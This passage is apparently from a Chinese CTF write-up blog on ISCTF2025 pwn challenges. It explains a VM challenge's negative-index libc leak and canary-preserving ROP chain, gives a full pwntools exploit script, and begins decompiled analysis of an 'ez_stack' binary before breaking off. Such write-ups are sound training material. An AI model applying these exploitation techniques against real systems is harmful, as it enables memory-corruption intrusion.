v9[v4];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_WORD *)ptr == <span class="number">9</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_WORD *__fastcall <span class="title function_">ret_code</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  _WORD *v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = a1;</span><br><span class="line">  v3 = (<span class="type">char</span> *)&amp;v2;</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">  *v4 = *v3;</span><br><span class="line">  v4[<span class="number">1</span>] = v3[<span class="number">1</span>];</span><br><span class="line">  v4[<span class="number">2</span>] = v3[<span class="number">2</span>];</span><br><span class="line">  v4[<span class="number">3</span>] = v3[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单来说就是如果是输入0x04030201，就是01是操作码，在这个程序指相减，02指存储位置是reg[2]，03和04指进行运算的位置为reg[3]、reg[4]</p>
<p>一般来说，虚拟寄存器都在bss段上，而且数组索引可以是负数，这样就可以使用负索引泄露libc地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.bss:<span class="number">0000000000202020</span> ; ===========================================================================</span><br><span class="line">.bss:<span class="number">0000000000202020</span></span><br><span class="line">.bss:<span class="number">0000000000202020</span> ; Segment type: Uninitialized</span><br><span class="line">.bss:<span class="number">0000000000202020</span> ; Segment permissions: Read/Write</span><br><span class="line">.bss:<span class="number">0000000000202020</span> _bss            segment align_32 public <span class="string">&#x27;BSS&#x27;</span> use64</span><br><span class="line">.bss:<span class="number">0000000000202020</span>                 assume cs:_bss</span><br><span class="line">.bss:<span class="number">0000000000202020</span>                 ;org <span class="number">202020</span>h</span><br><span class="line">.bss:<span class="number">0000000000202020</span>                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing</span><br><span class="line">.bss:<span class="number">0000000000202020</span>                 public <span class="built_in">stdout</span>@@GLIBC_2_2_5</span><br><span class="line">.bss:<span class="number">0000000000202020</span> ; FILE *<span class="built_in">stdout</span></span><br><span class="line">.bss:<span class="number">0000000000202020</span> <span class="built_in">stdout</span>@@GLIBC_2_2_5 dq ?                ; DATA XREF: init+<span class="number">4</span>↑r</span><br><span class="line">.bss:<span class="number">0000000000202020</span>                                         ; LOAD:<span class="number">0000000000203198</span>↓o</span><br><span class="line">.bss:<span class="number">0000000000202020</span>                                         ; Alternative name is <span class="string">&#x27;stdout&#x27;</span></span><br><span class="line">.bss:<span class="number">0000000000202020</span>                                         ; Copy of shared data</span><br><span class="line">.bss:<span class="number">0000000000202028</span>                 align <span class="number">10</span>h</span><br><span class="line">.bss:<span class="number">0000000000202030</span>                 public <span class="built_in">stdin</span>@@GLIBC_2_2_5</span><br><span class="line">.bss:<span class="number">0000000000202030</span> ; FILE *<span class="built_in">stdin</span></span><br><span class="line">.bss:<span class="number">0000000000202030</span> <span class="built_in">stdin</span>@@GLIBC_2_2_5 dq ?                 ; DATA XREF: init+<span class="number">22</span>↑r</span><br><span class="line">.bss:<span class="number">0000000000202030</span>                                         ; LOAD:<span class="number">00000000002031E0</span>↓o</span><br><span class="line">.bss:<span class="number">0000000000202030</span>                                         ; Alternative name is <span class="string">&#x27;stdin&#x27;</span></span><br><span class="line">.bss:<span class="number">0000000000202030</span>                                         ; Copy of shared data</span><br><span class="line">.bss:<span class="number">0000000000202038</span>                 align <span class="number">20</span>h</span><br><span class="line">.bss:<span class="number">0000000000202040</span>                 public <span class="built_in">stderr</span>@@GLIBC_2_2_5</span><br><span class="line">.bss:<span class="number">0000000000202040</span> ; FILE *<span class="built_in">stderr</span></span><br><span class="line">.bss:<span class="number">0000000000202040</span> <span class="built_in">stderr</span>@@GLIBC_2_2_5 dq ?                ; DATA XREF: init+<span class="number">40</span>↑r</span><br><span class="line">.bss:<span class="number">0000000000202040</span>                                         ; LOAD:<span class="number">0000000000203228</span>↓o</span><br><span class="line">.bss:<span class="number">0000000000202040</span>                                         ; Alternative name is <span class="string">&#x27;stderr&#x27;</span></span><br><span class="line">.bss:<span class="number">0000000000202040</span>                                         ; Copy of shared data</span><br><span class="line">.bss:<span class="number">0000000000202048</span> completed_7698  db ?                    ; DATA XREF: __do_global_dtors_aux↑r</span><br><span class="line">.bss:<span class="number">0000000000202048</span>                                         ; __do_global_dtors_aux+<span class="number">28</span>↑w</span><br><span class="line">.bss:<span class="number">0000000000202049</span>                 align <span class="number">20</span>h</span><br><span class="line">.bss:<span class="number">0000000000202060</span>                 public reg</span><br><span class="line">.bss:<span class="number">0000000000202060</span> ; __int64 reg[<span class="number">16</span>]</span><br><span class="line">.bss:<span class="number">0000000000202060</span> reg             dq <span class="number">10</span>h <span class="title function_">dup</span><span class="params">(?)</span>           ; DATA XREF: main+AC↑o</span><br><span class="line">.bss:<span class="number">0000000000202060</span>                                         ; main+CD↑o ...</span><br><span class="line">.bss:<span class="number">0000000000202060</span> _bss            ends</span><br><span class="line">.bss:<span class="number">0000000000202060</span></span><br></pre></td></tr></table></figure>
<p>在虚拟寄存器中计算好偏移并构造地址，使用push将地址放入栈中，这样就可以构造rop链</p>
<p>值得注意的是，当栈上的索引v6刚好指向canary时，可以使用pop将canary放入reg中，后面再用reg的canary使用push到原来的栈上的canary，这样就不会破坏canary，可以绕过canary保护</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">crun</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(content).encode())</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">times</span>):</span><br><span class="line">    crun(<span class="number">0x10e0700</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        crun(<span class="number">0x2070702</span>)</span><br><span class="line">    crun(<span class="number">0x7080800</span>)</span><br><span class="line"></span><br><span class="line">p=start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">513</span>):</span><br><span class="line">    crun(<span class="number">0xa07</span>)  <span class="comment">#移动v6指向canary</span></span><br><span class="line"></span><br><span class="line">crun(<span class="number">0xb08</span>)      <span class="comment">#将canary储存在0xb</span></span><br><span class="line">crun(<span class="number">0xa07</span>)      <span class="comment">#由于pop一次，再push一次</span></span><br><span class="line">crun(<span class="number">0xb07</span>)      <span class="comment">#push canary</span></span><br><span class="line">crun(<span class="number">0xa07</span>)      <span class="comment">#push rbp</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#open</span></span><br><span class="line">crun(<span class="number">0x1f00001</span>)   <span class="comment"># num=libc</span></span><br><span class="line">crun(<span class="number">0x103</span>)       <span class="comment"># num=1</span></span><br><span class="line">crun(<span class="number">0x1010204</span>)   <span class="comment"># num=2</span></span><br><span class="line">crun(<span class="number">0x1020304</span>)   <span class="comment"># num=4</span></span><br><span class="line">crun(<span class="number">0x1030404</span>)   <span class="comment"># num=8</span></span><br><span class="line">crun(<span class="number">0x2030504</span>)   <span class="comment"># num=16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#open 0xea720 read 0xeaa10 write 0xeaab0</span></span><br><span class="line"><span class="comment">#pop rdi 0x625 rsi 0x2091 rdx 0x666e9</span></span><br><span class="line"></span><br><span class="line">crun(<span class="number">0x2040600</span>)   <span class="comment"># 10</span></span><br><span class="line">crun(<span class="number">0x6010704</span>)   <span class="comment"># 1024</span></span><br><span class="line">crun(<span class="number">0x1070805</span>)   <span class="comment"># 512</span></span><br><span class="line">crun(<span class="number">0x7080700</span>)</span><br><span class="line">crun(<span class="number">0x3010804</span>)</span><br><span class="line">crun(<span class="number">0x1080804</span>)</span><br><span class="line">crun(<span class="number">0x7080700</span>)</span><br><span class="line">crun(<span class="number">0x7030700</span>)</span><br><span class="line">crun(<span class="number">0x7010700</span>)</span><br><span class="line">crun(<span class="number">0x7000700</span>)</span><br><span class="line">crun(<span class="number">0x707</span>)</span><br><span class="line"></span><br><span class="line">crun(<span class="number">0x9f50900</span>)   <span class="comment"># num=elf</span></span><br><span class="line">crun(<span class="number">0x4050602</span>)</span><br><span class="line">crun(<span class="number">0x6050600</span>)</span><br><span class="line">crun(<span class="number">0x6050600</span>)</span><br><span class="line">crun(<span class="number">0x6050600</span>)</span><br><span class="line">crun(<span class="number">0x6040600</span>)</span><br><span class="line">crun(<span class="number">0x6090600</span>)</span><br><span class="line">crun(<span class="number">0x607</span>)</span><br><span class="line"></span><br><span class="line">crun(<span class="number">0x8080801</span>)</span><br><span class="line">add(<span class="number">38</span>)</span><br><span class="line">add(<span class="number">37</span>)</span><br><span class="line">add(<span class="number">34</span>)</span><br><span class="line">add(<span class="number">33</span>)</span><br><span class="line">add(<span class="number">32</span>)</span><br><span class="line">add(<span class="number">30</span>)</span><br><span class="line">add(<span class="number">29</span>)</span><br><span class="line">add(<span class="number">24</span>)</span><br><span class="line">add(<span class="number">22</span>)</span><br><span class="line">add(<span class="number">21</span>)</span><br><span class="line">add(<span class="number">19</span>)</span><br><span class="line">add(<span class="number">18</span>)</span><br><span class="line">add(<span class="number">14</span>)</span><br><span class="line">add(<span class="number">13</span>)</span><br><span class="line">add(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">crun(<span class="number">0x1080c00</span>)</span><br><span class="line"></span><br><span class="line">crun(<span class="number">0x8080801</span>)</span><br><span class="line">add(<span class="number">13</span>)</span><br><span class="line">add(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">4</span>)</span><br><span class="line">crun(<span class="number">0x1080800</span>)</span><br><span class="line">crun(<span class="number">0x8000800</span>)</span><br><span class="line">crun(<span class="number">0x807</span>)</span><br><span class="line"></span><br><span class="line">crun(<span class="number">0x8080801</span>)</span><br><span class="line">crun(<span class="number">0x807</span>)</span><br><span class="line"></span><br><span class="line">crun(<span class="number">0x8080801</span>)</span><br><span class="line">add(<span class="number">19</span>)</span><br><span class="line">add(<span class="number">18</span>)</span><br><span class="line">add(<span class="number">17</span>)</span><br><span class="line">add(<span class="number">15</span>)</span><br><span class="line">add(<span class="number">13</span>)</span><br><span class="line">add(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">5</span>)</span><br><span class="line">crun(<span class="number">0x8000800</span>)</span><br><span class="line">crun(<span class="number">0x807</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">crun(<span class="number">0x8080801</span>)</span><br><span class="line">add(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">crun(<span class="number">0x1080800</span>)</span><br><span class="line">crun(<span class="number">0x8000800</span>)</span><br><span class="line">crun(<span class="number">0x807</span>)</span><br><span class="line"></span><br><span class="line">crun(<span class="number">0x8080801</span>)</span><br><span class="line">crun(<span class="number">0x1020800</span>)</span><br><span class="line">crun(<span class="number">0x807</span>)</span><br><span class="line"></span><br><span class="line">crun(<span class="number">0x8080801</span>)</span><br><span class="line">add(<span class="number">13</span>)</span><br><span class="line">add(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">4</span>)</span><br><span class="line">crun(<span class="number">0x1080800</span>)</span><br><span class="line">crun(<span class="number">0x8000800</span>)</span><br><span class="line">crun(<span class="number">0x807</span>)</span><br><span class="line"></span><br><span class="line">crun(<span class="number">0x8080801</span>)</span><br><span class="line">crun(<span class="number">0x5050802</span>)</span><br><span class="line">crun(<span class="number">0x9080800</span>)</span><br><span class="line">crun(<span class="number">0x807</span>)</span><br><span class="line"></span><br><span class="line">crun(<span class="number">0x8080801</span>)</span><br><span class="line">add(<span class="number">18</span>)</span><br><span class="line">add(<span class="number">17</span>)</span><br><span class="line">add(<span class="number">14</span>)</span><br><span class="line">add(<span class="number">13</span>)</span><br><span class="line">add(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">crun(<span class="number">0x1080800</span>)</span><br><span class="line">crun(<span class="number">0x8000800</span>)</span><br><span class="line">crun(<span class="number">0x807</span>)</span><br><span class="line"></span><br><span class="line">crun(<span class="number">0x8080801</span>)</span><br><span class="line">crun(<span class="number">0x5050802</span>)</span><br><span class="line">crun(<span class="number">0x807</span>)</span><br><span class="line"></span><br><span class="line">crun(<span class="number">0x8080801</span>)</span><br><span class="line">crun(<span class="number">0x807</span>)</span><br><span class="line"></span><br><span class="line">crun(<span class="number">0x8080801</span>)</span><br><span class="line">add(<span class="number">19</span>)</span><br><span class="line">add(<span class="number">18</span>)</span><br><span class="line">add(<span class="number">17</span>)</span><br><span class="line">add(<span class="number">15</span>)</span><br><span class="line">add(<span class="number">13</span>)</span><br><span class="line">add(<span class="number">11</span>)</span><br><span class="line">add(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">4</span>)</span><br><span class="line">crun(<span class="number">0x8000800</span>)</span><br><span class="line">crun(<span class="number">0x807</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">crun(<span class="number">0x8080801</span>)</span><br><span class="line">add(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">crun(<span class="number">0x1080800</span>)</span><br><span class="line">crun(<span class="number">0x8000800</span>)</span><br><span class="line">crun(<span class="number">0x807</span>)</span><br><span class="line"></span><br><span class="line">crun(<span class="number">0x8080801</span>)</span><br><span class="line">crun(<span class="number">0x1080800</span>)</span><br><span class="line">crun(<span class="number">0x807</span>)</span><br><span class="line"></span><br><span class="line">crun(<span class="number">0x8080801</span>)</span><br><span class="line">add(<span class="number">13</span>)</span><br><span class="line">add(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">4</span>)</span><br><span class="line">crun(<span class="number">0x1080800</span>)</span><br><span class="line">crun(<span class="number">0x8000800</span>)</span><br><span class="line">crun(<span class="number">0x807</span>)</span><br><span class="line"></span><br><span class="line">crun(<span class="number">0x8080801</span>)</span><br><span class="line">crun(<span class="number">0x5050802</span>)</span><br><span class="line">crun(<span class="number">0x9080800</span>)</span><br><span class="line">crun(<span class="number">0x807</span>)</span><br><span class="line"></span><br><span class="line">crun(<span class="number">0x8080801</span>)</span><br><span class="line">add(<span class="number">19</span>)</span><br><span class="line">add(<span class="number">18</span>)</span><br><span class="line">add(<span class="number">17</span>)</span><br><span class="line">add(<span class="number">15</span>)</span><br><span class="line">add(<span class="number">13</span>)</span><br><span class="line">add(<span class="number">11</span>)</span><br><span class="line">add(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">4</span>)</span><br><span class="line">crun(<span class="number">0x8000800</span>)</span><br><span class="line">crun(<span class="number">0x807</span>)</span><br><span class="line"></span><br><span class="line">crun(<span class="number">0x9</span>)     <span class="comment"># 触发rop链</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ez_stack">ez_stack</h3>
<p>保护如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> ~/ISCTF/ezstack  checksec ./pwn                                                                                                   </span><br><span class="line">[*] <span class="string">&#x27;/home/ubuntu/ISCTF/ezstack/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br></pre></td></tr></table></figure>
<p>函数如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_1429(a1, a2, a3);</span><br><span class="line">  sub_13B3(<span class="number">0LL</span>, <span class="number">0x114514000L</span>L, <span class="number">16LL</span>);</span><br><span class="line">  sub_150A();</span><br><span class="line">  sub_1785();</span><br><span class="line">  sub_1637();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_1429</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  _BYTE Welcome_to_ISCTF2025_[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    Welcome_to_ISCTF2025_[i] = <span class="number">0</span>;</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  qmemcpy(Welcome_to_ISCTF2025_, <span class="string">&quot;Welcome to ISCTF2025!&quot;</span>, <span class="number">21</span>);</span><br><span class="line">  sub_1343(Welcome_to_ISCTF2025_);</span><br><span class="line">  sub_1149(<span class="number">0x114514000L</span>L, <span class="number">4096LL</span>, <span class="number">7LL</span>, <span class="number">34LL</span>, <span class="number">-1LL</span>, <span class="number">9LL</span>);</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_13B3</span><span class="params">(<span class="type">int</span> a1, __int64 a2, <span class="type">int</span> i_2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 i_1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    i_1 = i;</span><br><span class="line">    <span class="keyword">if</span> ( i == i_2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_1149(a1, (<span class="type">int</span>)i + a2, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">    i_1 = *(<span class="type">unsigned</span> __int8 *)((<span class="type">int</span>)i + a2);</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)i_1 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i_1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_150A</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  _BYTE NO_SYSTEMCALL_HACK_[<span class="number">24</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    NO_SYSTEMCALL_HACK_[i] = <span class="number">0</span>;</span><br><span class="line">    ++v2;</span><br><span class="line">  &#125;</span><br><span class="line">  qmemcpy(NO_SYSTEMCALL_HACK_, <span class="string">&quot;NO SYSTEMCALL HACK!&quot;</span>, <span class="number">19</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">31</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(j + <span class="number">0x114514000L</span>L) == <span class="number">15</span> &amp;&amp; *(_BYTE *)(j + <span class="number">0x114514001L</span>L) == <span class="number">5</span> )</span><br><span class="line">      ++v1;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_1343((__int64)NO_SYSTEMCALL_HACK_);</span><br><span class="line">      sub_1149(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">60LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_1785</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  __int64 (__fastcall *main_1)(__int64, <span class="type">char</span> **, <span class="type">char</span> **); <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-28h] BYREF</span></span><br><span class="line">  _BYTE DO_YOU_LIKE_GIFT?[<span class="number">24</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  main_1 = main;</span><br><span class="line">  v3 = (__int64)&amp;v3;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">    DO_YOU_LIKE_GIFT?[i] = <span class="number">0</span>;</span><br><span class="line">  qmemcpy(DO_YOU_LIKE_GIFT?, <span class="string">&quot;DO YOU LIKE GIFT?&quot;</span>, <span class="number">17</span>);</span><br><span class="line">  sub_1343((__int64)DO_YOU_LIKE_GIFT?);</span><br><span class="line">  sub_1343((__int64)&amp;main_1);</span><br><span class="line">  sub_1343((__int64)&amp;v3);</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_1637</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-130h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-12Ch]</span></span><br><span class="line">  _BYTE RET_ADDR_ERROR[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-120h] BYREF</span></span><br><span class="line">  __int64 a2[<span class="number">34</span>]; <span class="comment">// [rsp+20h] [rbp-110h] BYREF</span></span><br><span class="line"></span><br><span class="line">  a2[<span class="number">33</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    RET_ADDR_ERROR[i] = <span class="number">0</span>;</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  qmemcpy(RET_ADDR_ERROR, <span class="string">&quot;RET ADDR ERROR&quot;</span>, <span class="number">14</span>);</span><br><span class="line">  sub_13B3(<span class="number">0</span>, (__int64)a2, <span class="number">4096</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>几个分支函数是这样的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_13B3</span><span class="params">(<span class="type">int</span> a1, __int64 a2, <span class="type">int</span> i_2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 i_1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    i_1 = i;</span><br><span class="line">    <span class="keyword">if</span> ( i == i_2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_1149(a1, (<span class="type">int</span>)i + a2, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">    i_1 = *(<span class="type">unsigned</span> __int8 *)((<span class="type">int</span>)i + a2);</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)i_1 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i_1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1343</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">    ;</span><br><span class="line">  sub_1149(<span class="number">1LL</span>, a1, i, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">1LL</span>);</span><br><span class="line">  sub_12B2();</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_12B2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  sub_1149();</span><br><span class="line">  <span class="keyword">return</span> v1 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看见整个题的核心就是sub_1149()，这个控制着syscall</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001149 ; __int64 sub_1149()</span><br><span class="line">.text:0000000000001149 sub_1149        proc near               ; CODE XREF: sub_117E+3B↓p</span><br><span class="line">.text:0000000000001149                                         ; sub_117E+118↓p ...</span><br><span class="line">.text:0000000000001149</span><br><span class="line">.text:0000000000001149 var_30          = qword ptr -30h</span><br><span class="line">.text:0000000000001149 var_28          = qword ptr -28h</span><br><span class="line">.text:0000000000001149 var_20          = qword ptr -20h</span><br><span class="line">.text:0000000000001149 var_18          = qword ptr -18h</span><br><span class="line">.text:0000000000001149 var_10          = qword ptr -10h</span><br><span class="line">.text:0000000000001149 var_8           = qword ptr -8</span><br><span class="line">.text:0000000000001149</span><br><span class="line">.text:0000000000001149 ; __unwind &#123;</span><br><span class="line">.text:0000000000001149                 endbr64</span><br><span class="line">.text:000000000000114D                 push    rbp</span><br><span class="line">.text:000000000000114E                 mov     rbp, rsp</span><br><span class="line">.text:0000000000001151                 mov     